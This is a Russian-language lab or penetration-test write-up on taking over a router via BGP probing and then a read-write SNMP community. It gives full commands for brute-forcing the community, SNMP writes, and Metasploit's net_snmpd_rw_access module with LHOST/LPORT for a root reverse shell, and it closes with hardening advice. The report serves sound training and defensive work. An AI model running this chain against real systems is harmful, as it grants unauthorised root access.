# Отчёт о проникновении в инфраструктуру Operation Takeover

## 1. Постановка задачи

Получив доступ к VLAN сетевых устройств, необходимо скомпрометировать один из роутеров инфраструктуры. Цель — получить доступ к устройству, эксплуатируя ошибки в его конфигурации. В ходе работы требовалось действовать как реальный атакующий: провести разведку, определить вектор атаки и получить контроль над роутером.


## 2. Первичная разведка

### 2.1. Сканирование портов

Первым шагом выполнено сканирование целевого хоста `10.128.144.92`:

```
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
179/tcp  open  tcpwrapped
Service Info: OS: Linux
```

**Обнаружено:**

- **22/tcp** — SSH (Ubuntu, OpenSSH 8.2p1). Требует учётных данных.
- **179/tcp** — BGP. `tcpwrapped` означает, что соединение принимается обёрткой (демон проверяет источник и рвёт, если он не в списке разрешённых).

### 2.2. Что такое BGP и почему это интересно

BGP (Border Gateway Protocol) — протокол маршрутизации между автономными системами (AS). Роутеры, устанавливающие BGP-сессию, обмениваются маршрутами: каждый анонсирует, какие IP-подсети ему принадлежат. Для установки сессии обе стороны должны быть согласованы по:

- IP-адресам пиров,
- номерам AS (`local-as` и `peer-as`),
- capabilities (поддерживаемые AFI/SAFI),
- иногда — TCP-MD5 (криптографическая подпись).

**Потенциальные векторы атаки на BGP:**

- подмена маршрутов (route manipulation),
- утечка маршрутов (route leaks),
- перехват трафика (BGP hijacking),
- ошибки аутентификации и конфигурации.


## 3. Попытка эксплуатации BGP — тупиковый путь

### 3.1. Проверка порта 179

Первым делом проверено TCP-соединение:

```bash
nc -nv -w 5 10.128.144.92 179
# (UNKNOWN) [10.128.144.92] 179 (bgp) open
```

Порт отвечает. Однако `tcpwrapped` в выводе nmap указывает на то, что TCP-обёртка (например, `tcpd` или встроенная проверка ACL) может рвать соединения от неавторизованных IP.

### 3.2. Попытка отправить BGP OPEN через Scapy

Написан скрипт `fuzz.py` для отправки BGP OPEN-сообщения:

```python
from scapy.all import *
load_contrib("bgp")

hdr = BGPHeader(type=1)
open_msg = BGPOpen(my_as=64512, bgp_id="192.168.135.182", hold_time=180)

resp = sr1(IP(dst="10.128.144.92")/TCP(dport=179, flags="PA")/hdr/open_msg, timeout=5)
if resp:
    resp.show()
else:
    print("No response")
```

Результат:

```
WARNING: [bgp.py] use_2_bytes_asn: True
Begin emission
Finished sending 1 packets
Received 0 packets
```

**Вывод:** цель приняла TCP, но не ответила на BGP OPEN. Это не обязательно означает, что BGP не работает — возможно, роутер просто не считает нас своим neighbor'ом.

### 3.3. Поднятие тестового BGP-спикера через ExaBGP

Для полноценной попытки установки сессии развёрнут BGP-демон **ExaBGP** с конфигом:

```
neighbor 10.130.131.81 {
    router-id 192.168.135.182;
    local-address 192.168.135.182;
    local-as 64512;
    peer-as 65001;

    family {
        ipv4 unicast;
    }

    static {
        route 203.0.113.0/24 next-hop self;
    }
}
```



Cоединение установилось, но было сразу разорвано:

```
outgoing-1  sending TCP payload (49) FFFF FFFF FFFF FFFF ... 0031 0104 FC00 00B4 C0A8 87B6 ...
outgoing-1  closing connection
outgoing-1  peer reset, error[the TCP connection was closed by the remote end]
```

**Разбор:**

- TCP-сессия устанавливается (OPEN-пакет уходит).
- Цель принимает OPEN, но **рвёт соединение молча**, без BGP NOTIFICATION.
- Это классический признак одного из трёх:

1. **Несовпадение параметров neighbor'а** (неверный `local-as`, `peer-as` или IP).
2. **TCP-MD5 mismatch** — подпись не совпадает, ядро рвёт соединение до попадания в BGP-демон.
3. **DPI/ACL**, который распознаёт BGP-пейлоад и сбрасывает соединение.

### 3.4. Почему этот путь — тупик

Все параметры (`local-as`, `peer-as`, `router-id`) подбирались **наугад**, потому что информации о реальном neighbor'е роутера не было. BGP — протокол, в котором **обе стороны должны быть согласованы**. Без точных данных о том, какой AS и IP роутер ждёт, установить сессию невозможно.

**Вывод:** необходимо найти источник информации о конфигурации роутера. BGP напрямую — не тот путь.


## 4. Обнаружение SNMP

### 4.1. Расширенное сканирование

При полном сканировании обнаружен дополнительный порт:

```
161/udp  open  snmp
```

SNMP (Simple Network Management Protocol) — протокол управления сетевыми устройствами. Он позволяет читать и, если разрешено, **изменять** параметры устройства. По умолчанию SNMP использует **community-строку** — что-то вроде пароля, передаваемого в открытом виде.

### 4.2. Поиск community-строки

Для подбора community-строки использован инструмент **onesixtyone** со стандартным словарём:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.128.144.92
```

Результат:

```
10.128.144.92 [pr1v4t3] Linux e42ceec45c86 5.15.0-1075-aws #82~20.04.1-Ubuntu SMP Thu Dec 19 05:24:09 UTC 2024 x86_64
```

**Найдена community-строка:** `pr1v4t3`.

Утилита также вернула системную информацию: hostname `e42ceec45c86` (характерно для Docker-контейнера), ядро Linux 5.15.0-1075-aws, ОС Ubuntu 20.04.

### 4.3. Проверка, что за устройство

Через `snmpwalk` собрана системная информация:

```bash
snmpwalk -v2c -c pr1v4t3 10.128.144.92 1.3.6.1.2.1.1
```

Ключевые ответы:

```
sysDescr.0  = "Linux e42ceec45c86 5.15.0-1075-aws ... x86_64"
sysObjectID = OID: iso.3.6.1.4.1.8072.3.2.10   # Net-SNMP
sysName.0   = "e42ceec45c86"
sysContact  = "Root <root@localhost>"
```

**Вывод:** это не Cisco/Juniper, а **Linux-хост с Net-SNMP-демоном** (вероятно, Docker-контейнер, играющий роль роутера).


## 5. Ключевая проверка: read-write доступ

SNMP может быть настроен на **read-only (RO)** или **read-write (RW)**. RO-community позволяет только читать OID. RW — позволяет **изменять** значения OID, что критично для эксплуатации.

### 5.1. Проверка RW через snmpset

Проверка записи в произвольный OID:

```bash
snmpset -v2c -c pr1v4t3 10.128.144.92 1.3.6.1.2.1.1.5.0 s "test"
```

Результат:

```
iso.3.6.1.2.1.1.5.0 = STRING: "test"
```

**Это подтверждение RW-доступа.** Команда `snmpset` записала новое значение в `sysName.0` и получила подтверждение от сервера. Если бы community была RO, вернулась бы ошибка `notWritable`.

### 5.2. Что это даёт

RW-доступ к SNMP — это фактически **удалённое выполнение команд**, если включена функциональность `extend` в Net-SNMP. Она позволяет создавать кастомные OID, при чтении которых демон выполняет заданную команду. Это документированный механизм мониторинга, но при RW-доступе он превращается в RCE.

**Ключевая уязвимость:** RW-community SNMP позволяет создавать OID-записи, которые при чтении выполняют произвольные команды на хосте.


## 6. Эксплуатация через Metasploit

### 6.1. Модуль

Для эксплуатации использован готовый Metasploit-модуль:

```
exploit/linux/snmp/net_snmpd_rw_access
```

Модуль использует SNMP-EXTEND-MIB для создания `extend`-записи с командой и последующего её выполнения через чтение соответствующего OID.

### 6.2. Настройка параметров

Ключевые настройки модуля:

```
set COMMUNITY pr1v4t3
set RHOSTS 10.128.144.92
set LHOST 192.168.135.182
set LPORT 4444
set TIMEOUT 10
set RETRIES 3
run
```

**Важно:** первая попытка с community `public` (значение по умолчанию) не сработала — `SNMP::RequestTimeout host not responding`. После замены на `pr1v4t3` эксплойт сработал.

### 6.3. Результат

Получен reverse shell:

```
id
uid=0(root) gid=0(root) groups=0(root)
```

**Мы root на хосте.** Эксплуатация SNMP дала полный контроль над системой.


## 7. Альтернативный метод: скрипт snmp-shell

Помимо Metasploit, эксплуатация возможна вручную через скрипт `snmp-shell`:

```bash
rlwrap python shell.py <target-ip> -c <community>
```

Скрипт:

1. создаёт `extend`-запись через `snmpset`,
2. триггерит выполнение через чтение,
3. парсит вывод из `nsExtendOutput`.

## 8. Итоговая цепочка атаки

1. **Nmap** → обнаружены порты 22 (SSH) и 179 (BGP, tcpwrapped).
2. **Попытка BGP** → BGP-сессия не поднимается, потому что параметры neighbor'а неизвестны, а цель рвёт соединения молча.
3. **Полное сканирование** → обнаружен **161/udp (SNMP)**.
4. **onesixtyone** → найдена community-строка **`pr1v4t3`**.
5. **snmpwalk** → определено, что это Linux + Net-SNMP.
6. **snmpset** → подтверждён **read-write доступ** к SNMP.
7. **Metasploit `net_snmpd_rw_access`** с `COMMUNITY pr1v4t3` → **RCE, root shell**.


## 9. Разбор уязвимостей

| Уязвимость | Описание | Последствия |
|---|---|---|
| **SNMP с дефолтной/слабой community** | Community `pr1v4t3` найдена стандартным словарём | Доступ к SNMP-дереву |
| **RW-доступ к SNMP** | Разрешена запись в OID | Возможность модификации конфигурации |
| **Включён `extend` в Net-SNMP** | При RW-доступе позволяет создавать OID с командами | **RCE** |
| **Открытый BGP без MD5/ACL** | Порт 179 доступен | Потенциальный route hijacking (не эксплуатирован) |
| **Отсутствие аутентификации SNMP** | Community передаётся открытым текстом | Перехват/подбор |

### Почему BGP-путь не сработал

BGP — протокол **строгой согласованности**: обе стороны должны совпадать по IP, AS, capabilities. Без знания конфигурации роутера установить сессию невозможно. Кроме того, `tcpwrapped` в выводе nmap указывает на **ACL**, ограничивающий доступ к порту 179 только известными neighbor'ами. Это правильная защита — с точки зрения атакующего, тупик.

### Почему SNMP-путь сработал

SNMP — устаревший протокол с **множеством врождённых проблем**:

1. **Community-строки** часто слабые и подбираются словарём.
2. **RW-доступ** даёт не только чтение, но и запись.
3. **`extend`** превращает RW-доступ в RCE.
4. **Аутентификации нет** — community идёт в открытом виде.

Это классическая ошибка конфигурации сетевых устройств: SNMP оставляют открытым «для мониторинга», не задумываясь, что через него можно получить полный контроль.


## 10. Рекомендации по устранению

1. **Отключить SNMPv1/v2c**, использовать **SNMPv3** с аутентификацией (`authPriv`) и уникальными кредами.
2. **Не использовать community-строки** (или задавать их длинными и случайными, хранить в секрете).
3. **Ограничить SNMP ACL** — разрешить только доверенным управляющим хостам.
4. **Отключить `extend`** в `snmpd.conf`, если он не нужен.
5. **Разделить RO и RW community**, RW — только там, где действительно нужно.
6. **BGP-соседи** — использовать TCP-MD5, ограничивать ACL, не принимать сессии от неавторизованных IP.
7. **Мониторинг SNMP-запросов** — алертить на попытки подбора community и на запись в чувствительные OID.


## 11. Заключение

Цель задания достигнута — получен root-доступ на роутере через **read-write SNMP community** с последующей эксплуатацией функции `extend` в Net-SNMP.

**Ключевой урок:** BGP — протокол с жёсткой согласованностью, и без знания конфигурации neighbor'а поднять сессию невозможно. Правильный подход — **не перебирать параметры наугад, а искать данные о конфигурации** через другие сервисы. В данном случае таким сервисом оказался SNMP с дефолтной community, RW-доступом и включённым `extend`.
